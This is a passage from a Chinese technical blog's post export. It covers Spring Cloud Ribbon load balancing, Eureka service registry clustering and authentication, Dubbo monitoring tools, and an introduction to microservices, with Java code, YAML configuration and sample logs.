User对象代码： 12345678910111213141516171819202122232425public class User implements Serializable &#123; private static final long serialVersionUID = 1339434510787399891L; private Long id; private String username; private String password; public User() &#123; &#125; public User(Long id, String username, String password) &#123; this.id = id; this.username = username; this.password = password; &#125; @Override public String toString() &#123; return &quot;User&#123;&quot; + &quot;id=&quot; + id + &quot;, username=&apos;&quot; + username + &apos;\&apos;&apos; + &quot;, password=&apos;&quot; + password + &apos;\&apos;&apos; + &apos;&#125;&apos;; &#125; // get,set略&#125; 需要注意的是，User对象必须有默认的构造方法，否则在JSON与实体对象转换的时候会抛出如下异常： JSON parse error: Can not construct instance of model.Class: no suitable constructor found 然后在Server-Consumer中使用RestTemplates分别去获取这些服务： 123456789101112131415161718192021222324252627282930313233343536373839404142@RestControllerpublic class TestController &#123; @Autowired private RestTemplate restTemplate; @GetMapping(&quot;user/&#123;id:\\d+&#125;&quot;) public User getUser(@PathVariable Long id) &#123; Map&lt;String, Object&gt; params = new HashMap&lt;&gt;(); params.put(&quot;id&quot;, id); URI uri = UriComponentsBuilder.fromUriString(&quot;http://Server-Provider/user/&#123;id&#125;&quot;) .build().expand(params).encode().toUri(); return this.restTemplate.getForEntity(uri, User.class).getBody(); &#125; @GetMapping(&quot;user&quot;) public List&lt;User&gt; getUsers() &#123; return this.restTemplate.getForObject(&quot;http://Server-Provider/user&quot;, List.class); &#125; @GetMapping(&quot;user/add&quot;) public String addUser() &#123; User user = new User(1L, &quot;mrbird&quot;, &quot;123456&quot;); HttpStatus status = this.restTemplate.postForEntity(&quot;http://Server-Provider/user&quot;, user, null).getStatusCode(); if (status.is2xxSuccessful()) &#123; return &quot;新增用户成功&quot;; &#125; else &#123; return &quot;新增用户失败&quot;; &#125; &#125; @GetMapping(&quot;user/update&quot;) public void updateUser() &#123; User user = new User(1L, &quot;mrbird&quot;, &quot;123456&quot;); this.restTemplate.put(&quot;http://Server-Provider/user&quot;, user); &#125; @GetMapping(&quot;user/delete/&#123;id:\\d+&#125;&quot;) public void deleteUser(@PathVariable Long id) &#123; this.restTemplate.delete(&quot;http://Server-Provider/user/&#123;1&#125;&quot;, id); &#125;&#125; 我们分别启动两个Eureka Server用于集群，两个Eureka Client（Server-Provider）实例，然后启动Server-Consumer。 使用Restlet Client访问http://localhost:9000/user/1（后面每个方法我们都访问两次，用于观察负载均衡），返回结果如下： 剩下的方法测试结果这里不贴出来了，当我们分别访问下面的连接后： http://localhost:9000/user/ http://localhost:9000/user/add http://localhost:9000/user/update http://localhost:9000/user/delete/1 查看Eureka客户端8082和8083的后台日志： 123456789101112131415161718192021222324252018-06-03 18:17:26.231 INFO 11188 --- [ main] .s.c.n.e.s.EurekaAutoServiceRegistration : Updating port to 80832018-06-03 18:17:26.236 INFO 11188 --- [ main] com.example.demo.DemoApplication : Started DemoApplication in 52.252 seconds (JVM running for 54.321)2018-06-03 18:21:29.097 INFO 11188 --- [io-8083-exec-10] o.a.c.c.C.[Tomcat].[localhost].[/] : Initializing Spring FrameworkServlet &apos;dispatcherServlet&apos;2018-06-03 18:21:29.098 INFO 11188 --- [io-8083-exec-10] o.s.web.servlet.DispatcherServlet : FrameworkServlet &apos;dispatcherServlet&apos;: initialization started2018-06-03 18:21:29.177 INFO 11188 --- [io-8083-exec-10] o.s.web.servlet.DispatcherServlet : FrameworkServlet &apos;dispatcherServlet&apos;: initialization completed in 79 ms2018-06-03 18:21:29.312 INFO 11188 --- [io-8083-exec-10] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-03 18:21:50.798 INFO 11188 --- [nio-8083-exec-9] c.e.demo.controller.UserController : 获取用户信息 [User&#123;id=1, username=&apos;mrbird&apos;, password=&apos;123456&apos;&#125;, User&#123;id=2, username=&apos;scott&apos;, password=&apos;123456&apos;&#125;]2018-06-03 18:22:25.351 INFO 11188 --- [trap-executor-0] c.n.d.s.r.aws.ConfigClusterResolver : Resolving eureka endpoints via configuration2018-06-03 18:22:44.718 INFO 11188 --- [nio-8083-exec-8] c.e.demo.controller.UserController : 新增用户成功 User&#123;id=1, username=&apos;mrbird&apos;, password=&apos;123456&apos;&#125;2018-06-03 18:24:34.313 INFO 11188 --- [nio-8083-exec-6] c.e.demo.controller.UserController : 删除用户成功 12018-06-03 18:17:21.296 INFO 16188 --- [ main] .s.c.n.e.s.EurekaAutoServiceRegistration : Updating port to 80822018-06-03 18:17:21.303 INFO 16188 --- [ main] com.example.demo.DemoApplication : Started DemoApplication in 57.152 seconds (JVM running for 58.239)2018-06-03 18:21:27.517 INFO 16188 --- [io-8082-exec-10] o.a.c.c.C.[Tomcat].[localhost].[/] : Initializing Spring FrameworkServlet &apos;dispatcherServlet&apos;2018-06-03 18:21:27.517 INFO 16188 --- [io-8082-exec-10] o.s.web.servlet.DispatcherServlet : FrameworkServlet &apos;dispatcherServlet&apos;: initialization started2018-06-03 18:21:27.567 INFO 16188 --- [io-8082-exec-10] o.s.web.servlet.DispatcherServlet : FrameworkServlet &apos;dispatcherServlet&apos;: initialization completed in 50 ms2018-06-03 18:21:27.732 INFO 16188 --- [io-8082-exec-10] c.e.demo.controller.UserController : 获取用户id为 1的信息2018-06-03 18:21:49.639 INFO 16188 --- [nio-8082-exec-9] c.e.demo.controller.UserController : 获取用户信息 [User&#123;id=1, username=&apos;mrbird&apos;, password=&apos;123456&apos;&#125;, User&#123;id=2, username=&apos;scott&apos;, password=&apos;123456&apos;&#125;]2018-06-03 18:22:12.313 INFO 16188 --- [trap-executor-0] c.n.d.s.r.aws.ConfigClusterResolver : Resolving eureka endpoints via configuration2018-06-03 18:22:46.111 INFO 16188 --- [nio-8082-exec-8] c.e.demo.controller.UserController : 新增用户成功 User&#123;id=1, username=&apos;mrbird&apos;, password=&apos;123456&apos;&#125;2018-06-03 18:23:55.732 INFO 16188 --- [nio-8082-exec-6] c.e.demo.controller.UserController : 更新用户成功 User&#123;id=1, username=&apos;mrbird&apos;, password=&apos;123456&apos;&#125;2018-06-03 18:23:58.297 INFO 16188 --- [nio-8082-exec-5] c.e.demo.controller.UserController : 更新用户成功 User&#123;id=1, username=&apos;mrbird&apos;, password=&apos;123456&apos;&#125;2018-06-03 18:24:37.266 INFO 16188 --- [nio-8082-exec-3] c.e.demo.controller.UserController : 删除用户成功 12018-06-03 18:27:12.314 INFO 16188 --- [trap-executor-0] c.n.d.s.r.aws.ConfigClusterResolver : Resolving eureka endpoints via configuration 发现方法都成功调用，并且是均衡的。 Spring Cloud Ribbon配置Spring Cloud Ribbon的配置分为全局和指定服务名称。比如我要指定全局的服务请求连接超时时间为200毫秒： 12ribbon: ConnectTimeout: 200 如果只是设置获取Server Provider服务的请求连接超时时间，我们只需要在配置最前面加上服务名称就行了，如： 123Server-Provider: ribbon: ConnectTimeout: 200 设置获取Server-Provider服务的负载均衡算法从轮询改为随机： 123Server-Provider: ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule 设置处理Server-Provider服务的超时时间： 123Server-Provider: ribbon: ReadTimeout: 1000 开启重试机制，即获取服务失败是否从另外一个节点重试，默认值为false： 12345spring: cloud: loadbalancer: retry: enabled: true 对Server-Provider的所有请求在失败的时候都进行重试： 123Server-Provider: ribbon: OkToRetryOnAllOperations: true 切换Server-Provider实例的重试次数： 123Server-Provider: ribbon: MaxAutoRetriesNextServer: 1 对Server-Provider当前实例的重试次数： 123Server-Provider: ribbon: MaxAutoRetries: 1 根据如上配置当访问Server-Provider服务实例（比如是8082）遇到故障的时候，Ribbon会再尝试访问一次当前实例（次数由MaxAutoRetries配置），如果不行，就换到8083实例进行访问（更换次数由 MaxAutoRetriesNextServer决定），如果还是不行，那就GG思密达，返回失败。 如果不和Eureka搭配使用的话，我们就需要手动指定服务清单给Ribbon： 123Server-Provider: ribbon: listOfServers: localhost:8082,localhost:8083 上面配置了名称为Server-Provider的服务，有两个节点可供使用（8082和8083）。]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>Ribbon</tag>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[监控Dubbo服务]]></title>
    <url>%2F2019%2F03%2F11%2F%E7%9B%91%E6%8E%A7Dubbo%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[Dubbo给我们提供了dubbo-admin和dubbo-monitor-simple用于监控Dubbo服务，可以用来监控接口暴露，注册情况，也可以显示接口的调用明细和调用时间。dubbo-admin和dubbo-monitor-simple的下载地址为：https://github.com/apache/incubator-dubbo-admin/tree/master，这里简单介绍它们如何使用。 准备要监控Dubbo服务，首先我们必须在Dubbo应用上提供连接监控中心的配置，Dubbo支持两种方式： 属性 对应URL参数 类型 是否必填 缺省值 作用 描述 兼容性 protocol protocol string 可选 dubbo 服务治理 监控中心协议，如果为protocol=”registry”， 表示从注册中心发现监控中心地址， 否则直连监控中心。 2.0.9以上版本 address string 可选 N/A 服务治理 直连监控中心服务器地址，address=”10.20.130.230:12080” 1.0.16以上版本 这里我们采用第一种方式，在上一节中的server-provider和server-consumer的配置文件中添加如下配置: 123dubbo: monitor: protocol: registry 配置好后，依次启动server-provider和server-consumer，接下来开始搭建监控中心。 dubbo-monitor-simple下载https://github.com/apache/incubator-dubbo-admin/tree/master源码后，使用IDEA导入dubbo-monitor-simple应用，修改其配置文件dubbo.properties内容： 1234567891011dubbo.container=log4j,spring,registry,jetty-monitordubbo.application.name=simple-monitordubbo.application.owner=dubbodubbo.registry.address=zookeeper://127.0.0.1:2181dubbo.protocol.port=7070dubbo.jetty.port=7000dubbo.jetty.directory=$&#123;user.home&#125;/monitordubbo.charts.directory=$&#123;user.home&#125;/monitor/chartsdubbo.statistics.directory=$&#123;user.home&#125;/monitor/statisticsdubbo.log4j.file=logs/dubbo-monitor-simple.logdubbo.log4j.level=WARN 上面主要指定了注册中心地址为zookeeper://127.0.0.1:2181，监控中心协议端口为7070以及监控应用访问端口为7000。 配置好后，运行启动类MonitorStarter的main方法来启动应用，启动后，访问http://localhost:7000便可看到如下页面： 在线应用信息: 多次访问http://localhost:8081/hello/mrbird后，便可以在监控中心查看服务调用情况： dubbo-admin使用IDEA导入dubbo-admin应用，修改其配置文件application.properties： 12345678910server.port=7001spring.velocity.cache=falsespring.velocity.charset=UTF-8spring.velocity.layout-url=/templates/default.vmspring.messages.fallback-to-system-locale=falsespring.messages.basename=i18n/messagespring.root.password=rootspring.guest.password=guestdubbo.registry.address=zookeeper://127.0.0.1:2181 上面配置主要配置了注册中心地址为zookeeper://127.0.0.1:2181，应用端口号为7001，root和guest账户的密码。 配置好后，启动应用（dubbo-admin使用Spring Boot构建，启动入口类即可），访问http://localhost:7001： duubo提供了新版的dubbo-admin，采用前后端分离的方式，前端由Vue.js构建，UI更为nice，不过还不完善，所以这里就不介绍了。]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>Dubbo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloudEureka服务治理]]></title>
    <url>%2F2019%2F03%2F09%2FSpringCloudEureka%E6%9C%8D%E5%8A%A1%E6%B2%BB%E7%90%86%2F</url>
    <content type="text"><![CDATA[考虑当前有两个微服务实例A和B，A服务需要调用B服务的某个REST接口。假如某一天B服务迁移到了另外一台服务器，IP和端口也发生了变化，这时候我们不得不去修改A服务中调用B服务REST接口的静态配置。随着公司业务的发展，微服务的数量也越来越多，服务间的关系可能变得非常复杂，传统的微服务维护变得愈加困难，也很容易出错。所谓服务治理就是用来实现各个微服务实例的自动化注册与发现，在这种模式下，服务间的调用不再通过指定具体的实例地址来实现，而是通过向服务注册中心获取服务名并发起请求调用实现。 Eureka是由Netflix开发的一款服务治理开源框架，Spring-cloud对其进行了集成。Eureka既包含了服务端也包含了客户端，Eureka服务端是一个服务注册中心(Eureka Server)，提供服务的注册和发现，即当前有哪些服务注册进来可供使用；Eureka客户端为服务提供者(Server Provider)，它将自己提供的服务注册到Eureka服务端，并周期性地发送心跳来更新它的服务租约，同时也能从服务端查询当前注册的服务信息并把它们缓存到本地并周期性地刷新服务状态。这样服务消费者(Server Consumer)便可以从服务注册中心获取服务名称，并消费服务。 三者关系如下图所示: 搭建Eureka-Server服务注册中心说了那么多，我们先来搭建一个Eureka服务端来充当服务注册中心。 新建一个Spring Boot项目，artifactId填Eureka-Service，然后引入Spring Cloud Edgware.SR3和spring-cloud-starter-eureka-server: 123456789101112131415161718&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Edgware.SR3&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 在启动类上添加@EnableEurekaServer注解，表明这是一个Eureka服务端： 1234567@EnableEurekaServer@SpringBootApplicationpublic class DemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(DemoApplication.class, args); &#125;&#125; 接着在application.yml中添加一些配置： 1234567891011server: port: 8080 eureka: instance: hostname: localhost client: register-with-eureka: false fetch-registry: false serviceUrl: defaultZone: http://$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka/ 上面配置了服务的端口为8080，剩下几个为Eureka配置： eureka.instance.hostname指定了Eureka服务端的IP； eureka.client.register-with-eureka表示是否将服务注册到Eureka服务端，由于自身就是Eureka服务端，所以设置为false； eureka.client.fetch-registry表示是否从Eureka服务端获取服务信息，因为这里只搭建了一个Eureka服务端，并不需要从别的Eureka服务端同步服务信息，所以这里设置为false； eureka.client.serviceUrl.defaultZone指定Eureka服务端的地址，默认值为http://localhost:8761/eureka。 配置完毕后启动服务，访问http://localhost:8080/，可看到： 由于还没有Eureka客户端将服务注册进来，所以Instances currently registered with Eureka列表是空的。 下面我们接着搭建一个Eureka客户端来提供服务。 搭建Eureka-Client服务提供者新建一个Spring Boot项目，artifactId填Eureka-Client，然后引入以下依赖： 123456789101112131415161718192021&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Edgware.SR3&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 接着编写一个TestController，对外提供一些REST服务： 1234567891011121314151617181920@RestControllerpublic class TestController &#123; private Logger log = LoggerFactory.getLogger(this.getClass()); @Autowired private DiscoveryClient client; @GetMapping(&quot;/info&quot;) public String info() &#123; @SuppressWarnings(&quot;deprecation&quot;) ServiceInstance instance = client.getLocalServiceInstance(); String info = &quot;host：&quot; + instance.getHost() + &quot;，service_id：&quot; + instance.getServiceId(); log.info(info); return info; &#125; @GetMapping(&quot;/hello&quot;) public String hello() &#123; return &quot;hello world&quot;; &#125;&#125; 上面代码注入了org.springframework.cloud.client.discovery.DiscoveryClient对象，可以获取当前服务的一些信息。 编写启动类，在启动类上加@EnableDiscoveryClient注解，表明这是一个Eureka客户端： 1234567@EnableDiscoveryClient@SpringBootApplicationpublic class DemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(DemoApplication.class, args); &#125;&#125; 最后配置application.yml： 12345678910111213server: port: 8082 spring: application: name: Server-Provider eureka: client: register-with-eureka: true fetch-registry: true serviceUrl: defaultZone: http://localhost:8080/eureka/ 稍微说明下这些配置的意思： server.port指定了服务的端口为8082； spring.application.name指定服务名称为Server-Provider，后续服务消费者要获取上面TestController中接口的时候会用到这个服务名； eureka.client.serviceUrl.defaultZone指定Eureka服务端的地址，这里为上面定义的Eureka服务端地址； eureka.client.register-with-eureka和eureka.client.fetch-registry上面已经解释了其意思，虽然这两个配置的默认值就是true，但这里还是显式配置下，使Eureka客户端的功能更为直观（即向服务端注册服务并定时从服务端获取服务缓存到本地）。 配置好后，启动Eureka-Client，可以从控制台中看到注册成功的消息： 1234567891011121314Registered Applications size is zero : trueApplication version is -1: trueGetting all instance registry info from the eureka serverThe response status is 200Starting heartbeat executor: renew interval is: 30InstanceInfoReplicator onDemand update allowed rate per min is 4Discovery Client initialized at timestamp 1530667498944 with initial instances Registering application Server-Provider with eureka with status UPSaw local status change event StatusChangeEvent [timestamp=1530667498949, current=UP, previous=STARTING] DiscoveryClient_SERVER-PROVIDER/192.168.73.109:Server-Provider:8082: registering service... DiscoveryClient_SERVER-PROVIDER/192.168.73.109:Server-Provider:8082 - registration status: 204Tomcat started on port(s): 8082 (http)Updating port to 8082Started DemoApplication in 7.007 seconds (JVM running for 8.355) 第3，4行输出表示已经成功从Eureka服务端获取到了服务；第5行表示发送心跳给Eureka服务端，续约（renew）服务；第8到11行表示已经成功将服务注册到了Eureka服务端。 再次访问http://localhost:8080/，可看到服务列表里已经出现了名字为Server-providerde服务了： UP表示在线的意思（如果Eureka客户端正常关闭，那么这里的状态将变为DOWN），点击后面的链接&lt;192.168.73.109:Server-Provider:8082&gt;将访问该服务的/info接口： 这时候关闭Eureka客户端，再次刷新http://localhost:8080/： 可看到虽然Eureka客户端已经关闭了，但是Eureka服务端页面的服务服务列表中依然还有该服务，并且页面红色文字提示： EMERGENCY! EUREKA MAY BE INCORRECTLY CLAIMING INSTANCES ARE UP WHEN THEY’RE NOT. RENEWALS ARE LESSER THAN THRESHOLD AND HENCE THE INSTANCES ARE NOT BEING EXPIRED JUST TO BE SAFE. 大致意思是Eureka已经进入了保护模式。微服务在部署之后可能由于网络问题造成Eureka客户端无法成功的发送心跳给Eureka服务端，这时候Eureka服务端认定Eureka客户端已经挂掉了，虽然实际上Eureka客户端还在正常的运行着。而保护模式就是为了解决这个问题，即当Eureka服务端在短时间内同时丢失了过多的Eureka客户端时，Eureka服务端会进入保护模式，不去剔除这些客户端。因为我们这里只部署了一个Eureka客户端服务，所以关闭客户端后满足“短时间内丢失过多Eureka客户端”的条件。 在开发中可以先将保护模式给关了，我们在Eureka服务端加上一条配置: 123eureka: server: enable-self-preservation: false Eureka-Server集群Eureka服务端充当了重要的角色，所有Eureka客户端都将自己提供的服务注册到Eureka服务端，然后供所有服务消费者使用。如果单节点的Eureka服务端宕机了，那么所有服务都无法正常的访问，这必将是灾难性的。为了提高Eureka服务端的可用性，我们一般会对其集群部署，即同时部署多个Eureka服务端，并且可以相互间同步服务。 在搭建Eureka服务端的时候我们曾把下面两个配置给关闭了： 1234eureka: client: register-with-eureka: false fetch-registry: false 实际上在Eureka集群模式中，开启这两个参数可以让当前Eureka服务端将自己也作为服务注册到别的Eureka服务端，并且从别的Eureka服务端获取服务进行同步。所以这里我们将这两个参数置为true（默认就是true），下面开始搭建Eureka服务端集群，为了简单起见这里只搭建两个节点的Eureka服务端集群。 在Eureka-Server项目的src/main/resource目录下新建application-peer1.yml，配置如下： 123456789101112131415server: port: 8080spring: application: name: Eureka-Servereureka: instance: hostname: peer1 client: serviceUrl: defaultZone: http://peer2:8081/eureka/ server: enable-self-preservation: false server.port=8080指定端口为8080；spring.application.name=Eureka-Server指定了服务名称为Eureka-Server；eureka.instance.hostname=peer1指定地址为peer1；eureka.client.serviceUrl.defaultZone=http://peer2:8081/eureka/指定Eureka服务端的地址为另外一个Eureka服务端的地址peer2。 下面我们创建另外一个Eureka服务端peer2的yml配置application-peer2.yml： 123456789101112131415server: port: 8081spring: application: name: Eureka-Servereureka: instance: hostname: peer2 client: serviceUrl: defaultZone: http://peer1:8080/eureka/ server: enable-self-preservation: false peer2中的serviceUrl我们指向Eureka服务端peer1。 为了让这种在一台机器上配置两个hostname的方式生效，我们需要修改下hosts文件（位置C:\Windows\System32\drivers\etc）： 12127.0.0.1 peer1127.0.0.1 peer2 我们将Eureka-Server项目打包成jar，然后分别运行以下两条命令来部署peer1和peer2： 12java -jar Eureka-Service-0.0.1-SNAPSHOT.jar --spring.profiles.active=peer1java -jar Eureka-Service-0.0.1-SNAPSHOT.jar --spring.profiles.active=peer2 启动后，我们来访问peer1http://localhost:8080/： 可看到DS Replicas(副本)指向了peer2，registered-replicas和available-replicas都指向了http://peer2:8081/eureka/。 访问http://localhost:8081/我们也可以看到类似的信息。 因为Eureka服务端做了集群处理，所以Eureka客户端指定的服务端地址也要进行修改： 1234eureka: client: serviceUrl: defaultZone: http://peer1:8080/eureka/,http://peer2:8081/eureka/ 我们将Eureka客户端（Server-Provider）打成jar包，然后分别用端口8082和8083启动两个服务： 12java -jar Eureka-Client-0.0.1-SNAPSHOT.jar --server.port=8082java -jar Eureka-Client-0.0.1-SNAPSHOT.jar --server.port=8083 然后访问http://peer2:8080/eureka/或者http://peer2:8081/eureka/： 搭建Server-Consumer服务消费者在实际项目中，Eureka客户端即是服务提供者，也是服务消费者，即自身的接口可能被别的服务访问，同时也可能调用别的服务接口。这里为了更好的演示，我们把服务消费者单独的分开来演示。 新建一个Spring Boot项目，artifactId填Server-Consumer，其主要的任务就是将自身的服务注册到Eureka服务端，并且获取Eureka服务端提供的服务并进行消费。这里服务的消费我们用Ribbon来完成，Ribbon是一款实现服务负载均衡的开源软件，这里不做详细介绍。 引入Eureka客户端和Ribbon依赖： 12345678910111213141516171819202122232425&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Edgware.SR3&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-ribbon&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 同样的，在入口类中加入@EnableDiscoveryClient注解用于发现服务和注册服务，并配置一个RestTemplate Bean，然后加上@LoadBalanced注解来开启负载均衡： 1234567891011121314151617181920import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;import org.springframework.cloud.client.loadbalancer.LoadBalanced;import org.springframework.context.annotation.Bean;import org.springframework.web.client.RestTemplate;@EnableDiscoveryClient@SpringBootApplicationpublic class DemoApplication &#123; @Bean @LoadBalanced RestTemplate restTemplate() &#123; return new RestTemplate(); &#125; public static void main(String[] args) &#123; SpringApplication.run(DemoApplication.class, args); &#125;&#125; 接着编写一个TestController，用于消费服务： 12345678910@RestControllerpublic class TestController &#123; @Autowired private RestTemplate restTemplate; @GetMapping(&quot;/info&quot;) public String getInfo() &#123; return this.restTemplate.getForEntity(&quot;http://Server-Provider/info&quot;, String.class).getBody(); &#125;&#125; 上面代码注入了RestTemplate，getInfo中使用RestTemplate对象均衡的去获取服务并消费。可以看到我们使用服务名称（Server-Provider）去获取服务的，而不是使用传统的IP加端口的形式。这就体现了使用Eureka去获取服务的好处，我们只要保证这个服务名称不变即可，IP和端口不再是我们关心的点。 最后编写下配置文件application.yml： 1234567891011server: port: 9000 spring: application: name: Server-Consumer eureka: client: serviceUrl: defaultZone: http://peer1:8080/eureka/,http://peer2:8081/eureka/ 端口为9000，服务名称为Server-Consumer并指定了Eureka服务端的地址。 启动该项目，访问http://localhost:9000/info： 成功获取到了信息，我们多次访问这个接口，然后观察8082和8083Eureka客户端的后台： 可以看到它们的后台都打印出了信息，说明我们从9000去获取服务是均衡的。 这时候我们关闭一个Eureka服务端，再次访问http://localhost:9000/info，还是可以成功获取到信息，这就是Eureka服务端集群的好处。 Eureka-Server添加认证出于安全的考虑，我们可能会对Eureka服务端添加用户认证的功能。我们在Eureka-Server引入Spring-Security依赖： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; 然后在application.yml中配置用户名和密码： 123456security: basic: enabled: true user: name: mrbird password: 123456 Eureka服务端配置了密码之后，所有eureka.client.serviceUrl.defaultZone的配置也必须配置上用户名和密码，格式为：eureka.client.serviceUrl.defaultZone=http://${userName}:${password}@${hosetname}:${port}/eureka/，如： 1234eureka: client: serviceUrl: defaultZone: http://mrbird:123456@peer2:8081/eureka/ 重新打包并部署后，访问http://localhost:8080/，页面将弹出验证窗口，输入用户名和密码后即可访问。 Eureka配置下面我们总结一下在Eureka中常用的配置选项及代表的含义： 配置 含义 默认值 eureka.client.enabled 是否启用Eureka Client true eureka.client.register-with-eureka 表示是否将自己注册到Eureka Server true eureka.client.fetch-registry 表示是否从Eureka Server获取注册的服务信息 true eureka.client.serviceUrl.defaultZone 配置Eureka Server地址，用于注册服务和获取服务 http://localhost:8761/eureka eureka.client.registry-fetch-interval-seconds 默认值为30秒，即每30秒去Eureka Server上获取服务并缓存 30 eureka.instance.lease-renewal-interval-in-seconds 向Eureka Server发送心跳的间隔时间，单位为秒，用于服务续约 30 eureka.instance.lease-expiration-duration-in-seconds 定义服务失效时间，即Eureka Server检测到Eureka Client木有心跳后（客户端意外下线）多少秒将其剔除 90 eureka.server.enable-self-preservation 用于开启Eureka Server自我保护功能 true eureka.client.instance-info-replication-interval-seconds 更新实例信息的变化到Eureka服务端的间隔时间，单位为秒 30 eureka.client.eureka-service-url-poll-interval-seconds 轮询Eureka服务端地址更改的间隔时间，单位为秒。 300 eureka.instance.prefer-ip-address 表示使用IP进行配置为不是域名 false eureka.client.healthcheck.enabled 默认Erueka Server是通过心跳来检测Eureka Client的健康状况的，通过置为true改变Eeureka Server对客户端健康检测的方式，改用Actuator的/health端点来检测。 false Eureka还有许多别的配置，具体可以参考EurekaClientConfigBean，EurekaServerConfigBean和EurekaInstanceConfigBean配置类的源码。]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
        <tag>Eureka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud与微服务]]></title>
    <url>%2F2019%2F03%2F05%2FSpringCloud%E4%B8%8E%E5%BE%AE%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[在传统的软件架构中，我们通常采用的是单体应用来构建一个系统，一个单体应用糅合了各种业务模块。起初在业务规模不是很大的情况下，对于单体应用的开发维护也相对容易。但随着企业的发展，业务规模与日递增，单体应用变得愈发臃肿。由于单体应用将各种业务模块聚合在一起，并且部署在一个进程内，所以通常我们对其中一个业务模块的修改也必须将整个应用重新打包上线。为了解决单体应用变得庞大脯肿之后产生的难以维护的问题，微服务架构便出现在了大家的视线里。 什么是微服务微服务 (Microservices) 是一种软件架构风格，起源于Peter Rodgers博士于 2005 年度云端运算博览会提出的微 Web 服务 (Micro-Web-Service) 。微服务主旨是将一个原本独立的系统 拆分成多个小型服务，这些小型服务都在各自独立的进程中运行，服务之间通过基于HTTP的RESTful API进行通信协作。下图展示了单体应用和微服务之间的区别： 在微服务的架构下，单体应用的各个业务模块被拆分为一个个单独的服务并部署在单独的进程里，每个服务都可以单独的部署和升级。这种去中心化的模式使得后期维护和开发变得更加灵活和方便。由于各个服务单独部署，所以可以使用不同的语句来开发各个业务服务模块。 什么是Spring CloudSpring Cloud是一个基于Spring Boot实现的微服务架构开发工具。它为微服务架构中涉及的配置管理、服务治理、断路器、智能路由、微代理、控制总线、全局锁、决策竞选、分布式会话和集群状态管理等操作提供了一种简单的开发方式。Spring Cloud的诞生并不是为了解决微服务中的某一个问题，而是提供了一套解决微服务架构实施的综合性解决方案。 Spring Cloud是一个由各个独立项目组成的综合项目，每个独立项目有着不同的发布节奏，为了管理每个版本的子项目清单，避免Spring Cloud的版本号与其子项目的版本号相混淆，没有采用版本号的方式，而是通过命名的方式。这些版本的名字采用了伦敦地铁站的名字，根据字母表的顺序来对应版本时间顺序。比如”Angel”是Spring Cloud的第一个发行版名称, “Brixton”是Spring Cloud的第二个发行版名称。当一个版本的Spring Cloud项目的发布内容积累到临界点或者一个严重bug解决可用后，就会发布一个”service releases”版本，简称SRX版本，其中X是一个递增的数字，所以Brixton.SR5就是Brixton的第5个Release版本。 截至2018年4月02日，Spring Cloud已经发布了代号为Finchley的快照版本，采用的Spring Boot版本为2.0.1.RELEASE。Spring Cloud的版本和Spring Boot的版本关系可以查看官网给的例子。 以下是Spring Cloud版本与各个独立项目版本对应关系表： Component Edgware.SR3 Finchley.RC1 Finchley.BUILD-SNAPSHOT spring-cloud-aws 1.2.2.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT spring-cloud-bus 1.3.2.RELEASE 2.0.0.RC1 2.0.0.BUILD-SNAPSHOT 